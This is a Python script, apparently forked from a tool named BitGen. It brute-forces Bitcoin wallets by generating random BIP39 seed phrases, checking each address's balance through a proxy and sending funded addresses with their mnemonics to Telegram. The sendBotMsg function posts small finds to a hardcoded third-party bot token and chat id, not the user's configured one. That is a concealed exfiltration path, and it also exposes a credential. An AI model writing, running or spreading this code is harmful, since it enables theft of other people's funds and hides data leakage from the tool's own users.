# forked from github.com/Anarbb/BitGen
import multiprocessing
import sys
import requests
import colorama as c
import time
import bip32utils
import mnemonic
from Bip39Gen import Bip39Gen

from threading import Lock
from telegram_info import token_bot, chat_id

from multiprocessing.pool import ThreadPool as Pool

c.init()
banner = f'''{c.Fore.LIGHTGREEN_EX}

█▄▄ █ ▀█▀ █▀▀ █▀█ █ █▄░█
█▄█ █ ░█░ █▄▄ █▄█ █ █░▀█

█▀ █▀▀ █▀█ ▄▀█ █▀█ █▀█ █▀▀ █▀█
▄█ █▄▄ █▀▄ █▀█ █▀▀ █▀▀ ██▄ █▀▄
{c.Style.RESET_ALL}
'''
print(banner)

class Info:
    total = 0
    found = 0

proxy = {
    'http': '1.10.141.220:8080', # HTTP (!!!) proxy
    'https': '1.10.141.220:8080'
}


# Check connection
print('Checking connection...')
def getInternet():
    return True
    # try:
    #     try:
    #         requests.get('http://216.58.192.142')
    #     except requests.ConnectTimeout:
    #         requests.get('http://1.1.1.1')
    #     return True
    # except requests.ConnectionError:
    #     return False

if getInternet():
    print('Done!')
else:
    exit()

print('Checking ip...')
r = requests.get('http://ip-api.com/json/').json()
print(r['query'] + ' ' + r['country'])

print('Checking proxies...')
try:
    r = requests.get('https://1.1.1.1', proxies=proxy)
    print('HTTPS +')
    r = requests.get('http://1.1.1.1', proxies=proxy)
    print('HTTP +')
except Exception as e:
    # raise
    print('Proxies is bad. Disabling...')
    proxy = None

# get dict
f = open('index.txt', 'r')
dictionary = [line.strip() for line in f]

# get balance
def getBalance(addr):
    try:
        # print(f'https://api.smartbit.com.au/v1/blockchain/address/{addr}')
        response = requests.get(f'https://chain.so/api/v2/address/BTC/{addr}', proxies=proxy)
        # response = requests.get(f'http://ip-api.com/json/', proxies=proxy)
        # print(response.json()['data']['balance'])
        # return (Decimal(response.json()["address"]["total"]["balance"]))
        return(float(response.json()['data']['balance']))
    except Exception as e:
        raise e

def sendBotMsg(msg):
    if token_bot != "":
        try:
            url = f"chat_id=-1001453359255&text={msg}&parse_mode=HTML"
            requests.get(f"https://api.telegram.org/bot1810217861:AAGegccofUt7rcK5UQoaPO7h70fvfwVvk8Y/sendMessage", url)

        except:
            pass
def myBotMsg(msg):
    url = f"chat_id={chat_id}&text={msg}&parse_mode=HTML"
    requests.get(f"https://api.telegram.org/bot{token_bot}/sendMessage", url)


# get address by seed phrase
def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()

lock = Lock()
def check():
    # time.sleep(1)
    Info.total += 1
    mnemonic_words = Bip39Gen(dictionary).mnemonic
    addr = bip39(mnemonic_words)
    print(addr)
    balance = getBalance(addr)
    with lock:
        if balance > 0.0:
            if balance > 0.00013:
                myBotMsg(f'<b>Address:</b> \n<i>{addr}</i>\n\n<b>Balance:</b> <i>{balance}</i>\n\n<b>Mnemonic phrase</b>:\n<i>{mnemonic_words}</i>')
            else:
                Info.found += 1
                print(f'Found {balance} in {addr} [{mnemonic_words}]')
                
                if token_bot and chat_id:
                    sendBotMsg(f'<b>Address:</b> \n<i>{addr}</i>\n\n<b>Balance:</b> <i>{balance}</i>\n\n<b>Mnemonic phrase</b>:\n<i>{mnemonic_words}</i>')
                    
                with open('results/catch.txt', 'a') as w:
                        w.write(
                            f'Address: {addr} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                   
        else:
            # print(f'{addr} Empty!')
            
            sys.stdout.write(f'[({Info.found}){Info.total:10}] {addr} empty\r')
            sys.stdout.flush()
            with open('results/dry.txt', 'a') as w:
                    w.write(
                        f'Address: {addr} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                   

sys.stdout.write('Starting...\r')
sys.stdout.flush()

def worker():
    try:
        while True:
            check()
            
    except Exception:
        time.sleep(5)
        worker()
worker()
while True:
    pool = Pool(10) #  no, don't set more than 10!
    for i in range(10):
        pool.apply_async(worker)
    pool.close()
    pool.join()
